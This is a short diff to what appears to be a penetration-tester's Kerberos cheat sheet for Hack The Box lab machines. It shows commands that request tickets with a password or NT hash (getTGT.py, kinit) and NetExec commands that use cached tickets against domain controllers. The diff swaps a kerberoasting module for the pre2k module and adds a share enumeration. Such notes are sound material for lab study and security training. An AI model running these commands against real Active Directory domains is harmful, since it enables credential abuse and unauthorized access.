@@ -9,12 +9,16 @@
 python3 getTGT.py domain.local/Administrator -hashes :aad3b435b51404eeaad3b435b51404ee:NTHASH
 python3 getTGT.py domain.local/user:Password123
 
+kinit P.Rosa@VINTAGE.HTB
+
 export KRB5CCNAME=user.ccache
 klist
 
 nxc smb dc.rustykey.htb --use-kcache
 
-nxc smb dc.rustykey.htb -k -M kerberoasting kerb_hashes
+nxc smb dc.rustykey.htb -k -M pre2k
+
+nxc smb dc01.vintage.htb -k --shares -u 'P.Rosa' --use-kcache
 ```
 
 ## PFX to CCACHE
